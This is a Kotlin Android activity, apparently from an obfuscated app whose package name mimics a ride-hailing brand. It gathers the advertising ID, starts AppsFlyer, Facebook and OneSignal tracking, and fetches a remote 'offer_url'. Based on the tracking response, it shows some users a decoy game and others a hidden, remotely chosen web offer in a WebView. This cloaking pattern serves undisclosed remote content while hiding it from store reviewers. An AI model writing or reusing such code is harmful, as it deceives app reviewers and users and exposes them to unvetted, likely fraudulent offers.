package sinet.startup.indrive

import android.content.Intent
import android.content.pm.ActivityInfo
import android.os.Bundle
import androidx.annotation.IdRes
import androidx.appcompat.app.AppCompatActivity
import androidx.constraintlayout.widget.ConstraintSet
import androidx.navigation.NavController
import androidx.navigation.findNavController
import com.badlogic.gdx.backends.android.AndroidFragmentApplication
import com.google.android.gms.ads.identifier.AdvertisingIdClient
import io.michaelrocks.paranoid.Obfuscate
import kotlinx.coroutines.CoroutineScope
import kotlinx.coroutines.Dispatchers
import kotlinx.coroutines.channels.BufferOverflow
import kotlinx.coroutines.flow.MutableSharedFlow
import kotlinx.coroutines.flow.first
import kotlinx.coroutines.launch
import sinet.startup.indrive.databinding.ActivityMainBinding
import sinet.startup.indrive.util.*
import sinet.startup.indrive.util.manager.DataStoreManager
import sinet.startup.indrive.util.network.RemoteConfig
import sinet.startup.indrive.util.network.RemoteConnect
import sinet.startup.indrive.util.network.haveNetworkConnection
import sinet.startup.indrive.webView.webViewFragment
import java.util.*
import kotlin.system.exitProcess

@Obfuscate
class MainActivity : AppCompatActivity(), AndroidFragmentApplication.Callbacks {

    companion object {
        lateinit var binding      : ActivityMainBinding
        lateinit var navController: NavController

        val startFragmentIdFlow = MutableSharedFlow<Int>(replay = 1, onBufferOverflow = BufferOverflow.DROP_OLDEST)
        var webViewURL = "google.com"

        val lottie by lazy { Lottie(binding) }
    }

    private val coroutineMain = CoroutineScope(Dispatchers.Main)



    override fun onCreate(savedInstanceState: Bundle?) {
        super.onCreate(savedInstanceState)

        initialize()
        log("Network = ${haveNetworkConnection()}")
        if (haveNetworkConnection().not()) lottie.showNotNetwork()
        else {
            lottie.showLoader()
            checkDataStore()

            coroutineMain.launch(Dispatchers.Main) {
                startFragmentIdFlow.collect { fragmentId ->
                    requestedOrientation = when (fragmentId) {
                        R.id.gameFragment    -> {

                            binding.root.also { rootCL ->
                                ConstraintSet().apply {
                                    clone(rootCL)
                                    constrainPercentWidth(binding.lottieLoader.id, .2f)
                                    setHorizontalBias(binding.lottieLoader.id, .9f)
                                }.applyTo(rootCL)
                            }

                            ActivityInfo.SCREEN_ORIENTATION_LANDSCAPE
                        }
                        R.id.webViewFragment -> ActivityInfo.SCREEN_ORIENTATION_FULL_USER
                        else                 -> ActivityInfo.SCREEN_ORIENTATION_FULL_USER
                    }
                    setStartDestination(fragmentId)
                }
            }
        }
    }

    override fun onDestroy() {
        super.onDestroy()
        exit()
    }

    override fun exit() {
        cancelCoroutinesAll(coroutineMain)
        finishAndRemoveTask()
        exitProcess(0)
    }

    override fun onActivityResult(requestCode: Int, resultCode: Int, data: Intent?) {
        super.onActivityResult(requestCode, resultCode, data)
        webViewFragment?.onActivityResult(requestCode, resultCode, data)
    }



    private fun initialize() {
        binding = ActivityMainBinding.inflate(layoutInflater)
        setContentView(binding.root)
        navController       = findNavController(R.id.nav_host_fragment)
    }

    private fun checkDataStore() {
        coroutineMain.launch(Dispatchers.IO) {
            when (DataStoreManager.Key.get()) {
                "Good" -> {
                    log("DataStoreManager Key = Good")
                    DataStoreManager.Link.get()?.let {
                        webViewURL = it
                        startFragmentIdFlow.tryEmit(R.id.webViewFragment)
                        OneSignalUtil.initialize()
                    }
                }
                "Bad" -> {
                    log("DataStoreManager Key = Bad")
                    startFragmentIdFlow.tryEmit(R.id.gameFragment)
                }
                else -> {
                    log("DataStoreManager Key = NONE")
                    getRemoteData()
                    initServices()
                    checking()
                }
            }
        }
    }

    private suspend fun initServices() {
        Global.advertisingId = AdvertisingIdClient.getAdvertisingIdInfo(appContext).id
        UUID.randomUUID().toString().also { uuid ->
            Global.uuid = uuid
            DataStoreManager.UUID.update { uuid }
        }

        AppsflyerUtil.initialize(this)
        FacebookUtil.initialize()
        OneSignalUtil.initialize()
    }

    private fun getRemoteData() {
        try {
            RemoteConnect.setRemoteConfig().also { jsonConfig ->
                RemoteConfig.apply {
                    linkerUrl      = jsonConfig.getString("start_url")
                    offerUrl       = jsonConfig.getString("offer_url")
                    isDisplayOffer = true//jsonConfig.getString("isDisplayOffer").contains("true")

                    log("""
                        
                        getRemoteData:
                        linkerUrl      = $linkerUrl
                        offerUrl       = $offerUrl
                        isDisplayOffer = $isDisplayOffer
                        """)
                }
            }
        } catch (e: Exception) {
            log("getRemoteData: ${e.message}")
            RemoteConfig.isDisplayOffer = false
        }
    }

    private fun checking() {
        coroutineMain.launch(Dispatchers.IO) {
            Global.finalUrl.collect { finalUrl ->
                log("checking finalUrl = $finalUrl")
                if (finalUrl != null) KTrack.sendData() else Global.responseCode.tryEmit("404")
            }
        }

        coroutineMain.launch(Dispatchers.Default) {
            Global.responseCode.collect { code ->
                when {
                    code == "200" && RemoteConfig.isDisplayOffer == true      -> {
                        log("checking Good")
                        DataStoreManager.Key.update { "Good" }
                        DataStoreManager.Link.update { Global.finalUrl.first()!! }
                        webViewURL = Global.finalUrl.first()!!
                        log("webViewURL = $webViewURL")
                        startFragmentIdFlow.tryEmit(R.id.webViewFragment)
                    }
                    else -> {
                        log("checking Bad")
                        DataStoreManager.Key.update { "Bad" }
                        startFragmentIdFlow.tryEmit(R.id.gameFragment)
                    }
                }
            }
        }

    }

    private fun setStartDestination(
        @IdRes destinationId: Int,
        args: Bundle? = null
    ) {
        with(navController) {
            navInflater.inflate(R.navigation.nav_graph).apply { setStartDestination(destinationId) }.also { setGraph(it, args) }
        }
    }
}